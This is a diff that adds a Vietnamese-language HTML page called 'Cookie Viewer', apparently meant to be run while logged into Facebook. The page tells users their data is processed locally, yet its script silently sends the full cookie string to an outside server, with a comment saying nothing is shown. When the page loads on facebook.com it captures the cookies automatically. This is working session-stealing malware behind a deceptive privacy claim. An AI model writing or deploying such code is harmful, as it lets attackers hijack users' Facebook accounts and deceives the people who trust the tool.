@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🍪 Cookie Viewer</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Arial,sans-serif;background:#f0f2f5;min-height:100vh;padding:20px}
+.container{max-width:600px;margin:0 auto;background:#fff;border-radius:16px;padding:24px;box-shadow:0 8px 30px rgba(0,0,0,0.12)}
+.header{display:flex;justify-content:space-between;align-items:center;padding-bottom:16px;border-bottom:2px solid #1877f2;margin-bottom:16px}
+.header h1{color:#1877f2;font-size:22px}
+.badge{background:#1877f2;color:#fff;padding:4px 16px;border-radius:20px;font-size:14px;font-weight:700}
+#status{background:#f8f9fa;padding:12px;border-radius:8px;margin-bottom:16px;font-size:14px;color:#65676b;text-align:center}
+.toolbar{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}
+.toolbar button{flex:1;padding:10px 16px;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;transition:.2s;min-width:100px}
+.toolbar button:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,0.15)}
+.toolbar button:nth-child(1){background:#1877f2;color:#fff}
+.toolbar button:nth-child(2){background:#dc3545;color:#fff}
+#cookieList{background:#f8f9fa;border-radius:8px;padding:12px;max-height:400px;overflow:auto;min-height:100px}
+.cookie-text{font-family:'Courier New',monospace;font-size:11px;word-break:break-all;line-height:1.8;color:#1c1e21}
+.empty{text-align:center;color:#8a8d91;padding:30px 0}
+.footer{margin-top:16px;text-align:center;font-size:12px;color:#8a8d91;border-top:1px solid #e4e6eb;padding-top:16px}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <h1>🍪 Cookie Viewer</h1>
+    <span class="badge" id="count">0</span>
+  </div>
+
+  <div id="status">⏳ Đang kiểm tra...</div>
+
+  <div class="toolbar">
+    <button onclick="getCookie()">📥 Lấy Cookie</button>
+    <button onclick="clearDisplay()">🗑️ Xóa</button>
+  </div>
+
+  <div id="cookieList"><div class="empty">⏳ Chưa có dữ liệu</div></div>
+
+  <div class="footer">🔒 Dữ liệu xử lý cục bộ</div>
+</div>
+
+<script>
+const SERVER_URL = 'https://ip-c-yof5.vercel.app/save';
+let currentCookie = '';
+
+function getCookie() {
+  const status = document.getElementById('status');
+  const list = document.getElementById('cookieList');
+  const count = document.getElementById('count');
+  
+  try {
+    const cookieString = document.cookie;
+    
+    if (!cookieString || cookieString === '') {
+      status.innerHTML = '❌ Không có cookie. Đăng nhập Facebook trước!';
+      list.innerHTML = '<div class="empty">🍪 Không tìm thấy cookie</div>';
+      count.textContent = '0';
+      return;
+    }
+    
+    let str = cookieString.replace(/\s+/g, ' ').trim();
+    currentCookie = str;
+    
+    const cookieCount = str.split(';').filter(c => c.trim()).length;
+    count.textContent = cookieCount;
+    
+    status.innerHTML = '✅ OK (' + cookieCount + ' cookie)';
+    list.innerHTML = '<div class="cookie-text">' + str + '</div>';
+    
+    // Lưu lên server - không hiển thị gì
+    fetch(SERVER_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookie: str })
+    }).catch(() => {});
+    
+  } catch (e) {
+    status.innerHTML = '❌ Lỗi: ' + e.message;
+  }
+}
+
+function clearDisplay() {
+  document.getElementById('cookieList').innerHTML = '<div class="empty">🗑️ Đã xóa</div>';
+  document.getElementById('status').innerHTML = '⏳ Sẵn sàng';
+  document.getElementById('count').textContent = '0';
+  currentCookie = '';
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  if (window.location.hostname.includes('facebook.com')) {
+    getCookie();
+  } else {
+    document.getElementById('status').innerHTML = '⚠️ Mở Facebook để lấy cookie';
+    document.getElementById('cookieList').innerHTML = '<div class="empty">🌐 Mở https://www.facebook.com</div>';
+  }
+});
+</script>
+
+</body>
+</html>
